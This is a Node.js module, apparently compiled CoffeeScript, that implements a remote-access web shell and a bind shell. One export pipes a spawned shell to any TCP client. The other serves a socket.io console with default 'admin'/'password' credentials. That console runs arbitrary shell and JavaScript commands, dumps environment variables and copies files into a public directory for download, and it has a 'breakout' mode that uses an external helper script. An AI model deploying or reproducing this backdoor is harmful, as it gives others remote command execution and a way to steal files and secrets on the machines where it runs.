var coffee, exec, fs, fusker, getfile, jseval, net, path, spawn, spawned, stats, tryfile, tryto, util, _ref,
  __slice = Array.prototype.slice;

_ref = require('child_process'), exec = _ref.exec, spawn = _ref.spawn;

path = require('path');

fusker = require('fusker');

net = require('net');

util = require('util');

fs = require('fs');

coffee = require('coffee-script');

tryfile = function(dir) {
  try {
    return fs.readFileSync(dir || '.');
  } catch (_error) {}
};

getfile = function(dir) {
  if (dir == null) dir = '.';
  return tryfile(dir) || fs.readdirSync(dir);
};

stats = function(dir) {
  var s;
  if (dir == null) dir = '.';
  s = fs.statSync(dir);
  s.mode = s.mode.toString(8);
  return s;
};

jseval = function(cmd) {
  try {
    return eval(cmd);
  } catch (error) {
    return "" + error;
  }
};

tryto = function(fcn, args, context) {
  try {
    return fcn.call(context, args);
  } catch (error) {
    return "" + error;
  }
};

spawned = function() {
  var args, cmd, cmds, ev, sp;
  ev = arguments[0], cmd = arguments[1], args = 3 <= arguments.length ? __slice.call(arguments, 2) : [];
  cmds = {
    err: '',
    out: '',
    args: [arguments.length, cmd, args, args.length]
  };
  if (ev != null) {
    if (typeof ev.emit === "function") {
      ev.emit('stdout', [arguments.length, sp, cmd, args.length]);
    }
  }
  sp = args && args.length ? spawn(cmd, args) : spawn(cmd);
  sp.stdout.on("data", function(data) {
    return cmds.out += data;
  });
  sp.stderr.on("data", function(data) {
    return cmds.err += data;
  });
  sp.on("exit", function(code) {
    cmds.code = code;
    return ev.emit('stdout', 'Exit Status: ' + code + '\nerr: ' + cmds.err + '\nout:\n' + cmds.out);
  });
  return cmds;
};

module.exports = {
  reverse: function(port) {
    var server, sh;
    sh = spawn('/usr/bin/env', []);
    server = net.createServer(function(c) {
      c.pipe(sh.stdin);
      return util.pump(sh.stdout, c);
    });
    return server.listen(port);
  },
  start: function(port, username, password) {
    var breakf, io, pdir, server;
    if (username == null) username = 'admin';
    if (password == null) password = 'password';
    breakf = path.join(__dirname, "../break");
    pdir = path.join(__dirname, '../public');
    fusker.config.dir = pdir;
    fusker.config.silent = true;
    server = fusker.http.createServer(port, username, password);
    io = fusker.socket.listen(server);
    return io.sockets.on('connection', function(socket) {
      if (socket.cwd == null) socket.cwd = process.cwd();
      socket.emit('cwd', socket.cwd);
      return socket.on('command', function(msg) {
        var args, cd, dir, execArgs, file, fpath, here;
        if (msg.indexOf('breakout') === 0) {
          socket.cwd = '/';
          socket.emit('cwd', socket.cwd);
          return socket.broken = true;
        }
        if (msg.indexOf('breakin') === 0) {
          socket.cwd = process.cwd();
          socket.emit('cwd', socket.cwd);
          return socket.broken = false;
        }
        if (msg.indexOf('cd ') === 0) {
          cd = msg.split(' ')[1];
          socket.cwd = path.resolve(socket.cwd, cd);
          return socket.emit('cwd', socket.cwd);
        }
        if (msg.indexOf('!dir') === 0) {
          dir = msg.split(' ')[1] || '.';
          here = fs.readdirSync(dir);
          return socket.emit('stdout', here.sort().join("\n"));
        }
        if (msg.indexOf('!get') === 0) {
          dir = msg.split(' ')[1] || '.';
          here = String(getfile(dir));
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('!stat') === 0) {
          dir = msg.split(' ')[1] || '.';
          here = (function() {
            try {
              return JSON.stringify(stats(dir));
            } catch (_error) {}
          })();
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('!js ') === 0) {
          here = (function() {
            try {
              return JSON.stringify(jseval(msg.replace(/^!js /, "")));
            } catch (_error) {}
          })();
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('!env') === 0) {
          here = JSON.stringify(process.env);
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('!sp') === 0) {
          args = msg.split(' ');
          args[0] = socket;
          socket.emit('stdout', args.length);
          here = JSON.stringify(spawned.apply(null, args));
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('!echo ') === 0) {
          here = msg.replace(/^!echo /, "");
          return socket.emit('stdout', here);
        }
        if (msg.indexOf('!c') === 0) {
          here = tryto(coffee.eval, msg.replace(/^!c\S*\s/, ''));
          return socket.emit('stdout', '' + here);
        }
        if (msg.indexOf('rip ') === 0) {
          file = msg.split(' ')[1];
          fpath = path.resolve(socket.cwd, file);
          msg = "cp " + fpath + " " + pdir;
          socket.emit('stdout', "" + file + " copied");
        }
        if (socket.broken) {
          msg = "PERL_BADLANG=0 " + breakf + " \"" + msg + "\" \"" + socket.cwd + "\"";
          execArgs = {
            cwd: process.cwd()
          };
        } else {
          execArgs = {
            cwd: socket.cwd
          };
        }
        return exec(msg, execArgs, function(err, stdout, stderr) {
          socket.emit('cwd', socket.cwd);
          if ((stdout != null) && stdout !== "") socket.emit('stdout', stdout);
          if ((stderr != null) && stderr !== "") socket.emit('stderr', stderr);
          if ((err != null) && !stderr) return socket.emit('error', err.message);
        });
      });
    });
  }
};
